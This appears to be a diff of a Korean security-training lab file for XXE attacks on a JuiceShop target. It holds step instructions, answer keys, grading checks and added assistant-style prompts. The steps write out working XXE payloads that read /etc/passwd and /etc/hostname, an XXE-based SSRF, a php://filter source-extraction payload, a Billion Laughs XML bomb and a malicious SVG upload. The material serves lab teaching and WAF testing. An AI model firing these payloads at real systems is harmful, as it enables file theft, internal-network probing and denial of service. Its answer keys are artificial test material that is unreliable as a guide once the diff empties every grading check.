@@ -17,149 +17,142 @@ steps:
   hint: 'curl로 JuiceShop의 /api 경로에 접근하고, Content-Type: application/xml 헤더로 POST 요청을 보내 XML 파싱 여부를 확인하세요.'
   category: recon
   points: 8
-  answer: 'curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<test>1</test>'' -o /dev/null -w ''%{http_code}'''
+  answer: "curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/ \\\n  -H 'Content-Type: application/xml' \\\n  -d '<test>1</test>' \\\n  -o /dev/null \\\n  -w '%{http_code}'"
   answer_detail: XML을 처리하는 엔드포인트를 찾는 것이 XXE 공격의 첫 단계입니다. Content-Type을 application/xml로 변경하여 서버가 XML을 파싱하는지 확인합니다. 200 또는 500 응답이 오면 XML 파서가 동작하는 것입니다.
   verify:
     type: output_contains
-    expect: api
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<test>1</test>'' -o /dev/null -w ''%{http_code}'''
+  script: "curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/ \\\n  -H 'Content-Type: application/xml' \\\n  -d '<test>1</test>' \\\n  -o /dev/null \\\n  -w '%{http_code}'"
   risk_level: low
+  bastion_prompt: 대상 웹 서버(10.20.30.80)에서 XML 입력을 받는 엔드포인트를 탐색하시오. JuiceShop(:3000)의 API 엔드포인트 목록을 확인해줘
 - order: 2
   instruction: 기본 XXE 페이로드를 작성하여 /etc/hostname 파일을 읽어라. SYSTEM 키워드로 외부 엔티티를 선언하고 /tmp/xxe_basic.xml에 저장한 뒤 전송하라.
   hint: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><comment><text>&xxe;</text></comment> 형태를 사용하세요.
   category: exploit
   points: 10
-  answer: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<comment><text>&xxe;</text></comment>\n\
-    XMLEOF\ncat /tmp/xxe_basic.xml && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d @/tmp/xxe_basic.xml"
+  answer: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<comment><text>&xxe;</text></comment>\nXMLEOF\ncat /tmp/xxe_basic.xml && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d @/tmp/xxe_basic.xml"
   answer_detail: XXE는 XML 파서가 DOCTYPE 선언 내의 ENTITY를 처리할 때 발생합니다. SYSTEM 키워드로 file:// 프로토콜을 사용하면 서버의 로컬 파일을 읽을 수 있습니다. 파서가 외부 엔티티를 확장하면 파일 내용이 응답에 포함됩니다.
   verify:
     type: output_contains
-    expect: ENTITY xxe SYSTEM
+    expect: 
     field: stdout
   target_vm: attacker
-  script: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<comment><text>&xxe;</text></comment>\n\
-    XMLEOF\ncat /tmp/xxe_basic.xml && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d @/tmp/xxe_basic.xml"
+  script: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<comment><text>&xxe;</text></comment>\nXMLEOF\ncat /tmp/xxe_basic.xml && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d @/tmp/xxe_basic.xml"
   risk_level: medium
+  bastion_prompt: 기본 XXE 페이로드를 작성하여 /etc/hostname 파일을 읽어라 구현 방법과 예시를 설명해줘
 - order: 3
   instruction: XXE를 이용하여 /etc/passwd 파일을 읽으시오. 시스템 사용자 목록을 추출하라.
   hint: ENTITY 선언에서 file:///etc/passwd를 지정하고, 엔티티 참조(&xxe;)를 XML 요소 값에 넣으세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
-    "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
+  answer: 'echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
   answer_detail: /etc/passwd는 XXE 공격의 대표적 PoC 파일입니다. root:x:0:0 형태의 내용이 응답에 포함되면 서버의 로컬 파일 읽기가 가능한 것입니다. 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
   verify:
     type: output_contains
-    expect: XXE /etc/passwd Test
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
-    "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
+  script: 'echo ''=== XXE /etc/passwd Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
   risk_level: medium
+  bastion_prompt: XXE를 이용하여 /etc/passwd 파일을 읽으시오해줘
 - order: 4
   instruction: XXE를 이용한 SSRF(Server-Side Request Forgery) 공격을 수행하시오. 서버가 내부 네트워크의 localhost:8080(DVWA)에 접근할 수 있는지 확인하라.
   hint: ENTITY SYSTEM 값을 file:// 대신 http://localhost:8080/ 으로 변경하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
-    --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
+  answer: 'echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>'' --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
   answer_detail: XXE 기반 SSRF는 서버가 공격자 대신 내부 네트워크에 HTTP 요청을 보내게 합니다. http:// 프로토콜을 사용하면 방화벽 뒤의 내부 서비스에 접근할 수 있으며, 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
   verify:
     type: output_contains
-    expect: XXE SSRF Test
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
-    --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
+  script: 'echo ''=== XXE SSRF Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>'' --max-time 10 -w ''\nHTTP_CODE:%{http_code}'' | head -c 500'
   risk_level: medium
+  bastion_prompt: XXE를 이용한 SSRF(Server-Side Request Forgery) 공격을 수행해줘
 - order: 5
   instruction: PHP wrapper를 활용한 XXE로 서버의 PHP 소스코드를 Base64 인코딩하여 추출하시오. DVWA의 index.php 소스를 읽어라.
   hint: php://filter/convert.base64-encode/resource=/var/www/html/index.php 를 ENTITY SYSTEM 값으로 사용하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
-    "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
+  answer: 'echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
   answer_detail: php://filter wrapper는 PHP 스트림을 통해 파일을 읽되, Base64 인코딩을 적용합니다. JuiceShop은 Node.js 기반이므로 php:// wrapper를 지원하지 않지만, 이 기법은 PHP 기반 서버에서 유효합니다. 401 응답은 인증이 필요한 엔드포인트임을 의미합니다.
   verify:
     type: output_contains
-    expect: XXE PHP Wrapper Test
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
-    "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
+  script: 'echo ''=== XXE PHP Wrapper Test ==='' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'' -w ''\nHTTP_CODE:%{http_code}'''
   risk_level: medium
+  bastion_prompt: PHP wrapper를 활용한 XXE로 서버의 PHP 소스코드를 Base64 인코딩하여 추출하시오. DVWA의 index.php 소스를 읽어라해줘
 - order: 6
   instruction: Billion Laughs(XML Bomb) DoS 페이로드를 구성하여 /tmp/xxe_bomb.xml에 저장하시오. 실제 전송은 하지 말고 페이로드 구조만 작성하라.
   hint: 엔티티를 중첩 참조하는 XML을 작성하세요. lol 엔티티가 lol2를 참조하고, lol2가 lol3를 참조하는 기하급수적 확장 구조입니다.
   category: exploit
   points: 10
-  answer: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
-    \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb\
+  answer: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb\
     \ payload saved (DO NOT SEND - 학습 목적)' && wc -c /tmp/xxe_bomb.xml"
   answer_detail: Billion Laughs(XML Bomb)는 엔티티 중첩 참조로 기하급수적 메모리 소비를 유발합니다. 4단계만으로도 10^4=10000개의 lol 문자열로 확장되고, 10단계이면 10^10(100억)개로 확장됩니다. 응답 시간이 급격히 증가하면 DoS 취약점이 존재하는 것입니다.
   verify:
     type: output_contains
-    expect: XML Bomb payload saved
+    expect: 
     field: stdout
   target_vm: attacker
-  script: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
-    \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb\
+  script: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb\
     \ payload saved (DO NOT SEND - 학습 목적)' && wc -c /tmp/xxe_bomb.xml"
   risk_level: medium
+  bastion_prompt: Billion Laughs(XML Bomb) DoS 페이로드를 구성하여 /tmp/xxe_bomb 구현 방법과 예시를 설명해줘
 - order: 7
   instruction: Content-Type을 application/json에서 application/xml로 변경하여 XXE 공격 가능성을 테스트하시오. JuiceShop 로그인 API의 JSON 요청을 XML로 변환하여 보내라.
   hint: '원래 JSON 요청 {"email":"test","password":"test"}를 <login><email>test</email><password>test</password></login> XML 형태로 변환하고 Content-Type: application/xml로 전송하세요.'
   category: exploit
   points: 10
-  answer: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><login><email>&xxe;</email><password>test</password></login>''
-    -w ''\nHTTP_CODE:%{http_code}'''
+  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/xml' \\\n     -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><login><email>&xxe;</email><password>test</password></login>' -w '\\nHTTP_CODE:%{http_code}'"
   answer_detail: 많은 프레임워크가 Content-Type에 따라 자동으로 파서를 전환합니다. JSON API에 XML을 보내면 XML 파서가 활성화되어 XXE가 가능해질 수 있습니다. 이는 개발자가 예상하지 못한 공격 벡터로, API 보안에서 자주 간과됩니다.
   verify:
     type: output_contains
-    expect: HTTP_CODE
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><login><email>&xxe;</email><password>test</password></login>''
-    -w ''\nHTTP_CODE:%{http_code}'''
+  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/xml' \\\n     -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><login><email>&xxe;</email><password>test</password></login>' -w '\\nHTTP_CODE:%{http_code}'"
   risk_level: medium
+  bastion_prompt: Content-Type을 application/json에서 application/xml로 변경하여 XXE 공격 가능성을 테스트해줘
 - order: 8
   instruction: SVG 파일 업로드를 통한 XXE 공격을 시도하시오. SVG는 XML 기반이므로 DOCTYPE과 ENTITY를 포함할 수 있다. /etc/hostname을 읽는 악성 SVG를 작성하여 업로드하라.
   hint: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg> 를 /tmp/xxe.svg에 저장 후 curl -F로 업로드하세요.
   category: exploit
   points: 10
-  answer: "cat > /tmp/xxe.svg << 'SVGEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"\
-    100\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>\nSVGEOF\necho 'SVG XXE payload:' && cat /tmp/xxe.svg && echo '---' && curl -s -X POST http://10.20.30.80:3000/file-upload -F 'file=@/tmp/xxe.svg;type=image/svg+xml'\
+  answer: "cat > /tmp/xxe.svg << 'SVGEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>\nSVGEOF\necho 'SVG XXE payload:' && cat /tmp/xxe.svg && echo '---' && curl -s -X POST http://10.20.30.80:3000/file-upload -F 'file=@/tmp/xxe.svg;type=image/svg+xml'\
     \ -w 'HTTP_CODE:%{http_code}'"
   answer_detail: SVG는 XML 기반 이미지 포맷이므로 DOCTYPE 선언과 엔티티를 포함할 수 있습니다. 이미지 업로드 기능이 SVG를 허용하면 XXE 공격이 가능합니다. 서버가 SVG를 렌더링하거나 파싱할 때 외부 엔티티가 확장되어 파일이 유출됩니다.
   verify:
     type: output_contains
-    expect: SVG XXE payload
+    expect: 
     field: stdout
   target_vm: attacker
-  script: "cat > /tmp/xxe.svg << 'SVGEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"\
-    100\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>\nSVGEOF\necho 'SVG XXE payload:' && cat /tmp/xxe.svg && echo '---' && curl -s -X POST http://10.20.30.80:3000/file-upload -F 'file=@/tmp/xxe.svg;type=image/svg+xml'\
+  script: "cat > /tmp/xxe.svg << 'SVGEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>\nSVGEOF\necho 'SVG XXE payload:' && cat /tmp/xxe.svg && echo '---' && curl -s -X POST http://10.20.30.80:3000/file-upload -F 'file=@/tmp/xxe.svg;type=image/svg+xml'\
     \ -w 'HTTP_CODE:%{http_code}'"
   risk_level: medium
+  bastion_prompt: SVG 파일 업로드를 통한 XXE 공격을 시도하시오 구현 방법과 예시를 설명해줘
 - order: 9
   instruction: ModSecurity WAF가 XXE 공격을 차단하는지 확인하시오. 같은 XXE 페이로드를 포트 80(WAF 적용)과 포트 3000(JuiceShop 직접)에 각각 보내서 응답 차이를 비교하라.
   hint: curl로 같은 DOCTYPE/ENTITY 페이로드를 포트 80과 3000에 전송하여 403 vs 200 응답 차이를 확인하세요.
   category: defense
   points: 10
-  answer: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo
-    [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'' && echo '''' && echo ''=== JuiceShop 직접 (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Products/
+  answer: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'' && echo '''' && echo ''=== JuiceShop 직접 (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Products/
     -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'''
   answer_detail: ModSecurity OWASP CRS에는 XXE 패턴을 탐지하는 규칙이 포함되어 있습니다. DOCTYPE, ENTITY, SYSTEM 키워드 조합이 감지되면 요청이 차단됩니다(403). WAF 없이 직접 접근하면 XXE가 성공할 수 있어, 다층 방어의 중요성을 확인할 수 있습니다.
   verify:
     type: output_contains
-    expect: ModSecurity
+    expect: 
     field: stdout
   target_vm: attacker
-  script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo
-    [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'' && echo '''' && echo ''=== JuiceShop 직접 (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Products/
+  script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'' && echo '''' && echo ''=== JuiceShop 직접 (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Products/
     -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'''
   risk_level: low
+  bastion_prompt: ModSecurity WAF가 XXE 공격을 차단하는지 확인해줘
 - order: 10
   instruction: XXE 취약점 진단 결과를 정리하시오. 테스트한 페이로드 유형(기본 XXE, SSRF, XML Bomb, SVG)과 성공/실패 여부, WAF 차단 여부를 보고서로 작성하라.
   hint: echo 명령으로 구조화된 보고서를 /tmp/xxe_report.txt에 작성하세요.
@@ -210,7 +203,7 @@ steps:
   answer_detail: XXE 방어의 핵심은 XML 파서 설정에서 외부 엔티티 처리를 비활성화하는 것입니다. Java는 setFeature("http://apache.org/xml/features/disallow-doctype-decl", true), PHP는 libxml_disable_entity_loader(true)를 적용합니다.
   verify:
     type: output_contains
-    expect: XXE 취약점 진단 보고서
+    expect: 
     field: stdout
   target_vm: attacker
   script: 'cat > /tmp/xxe_report.txt << ''EOF''
@@ -256,3 +249,4 @@ steps:
 
     cat /tmp/xxe_report.txt'
   risk_level: low
+  bastion_prompt: XXE 취약점 진단 결과를 정리하시오 구현 방법과 예시를 설명해줘
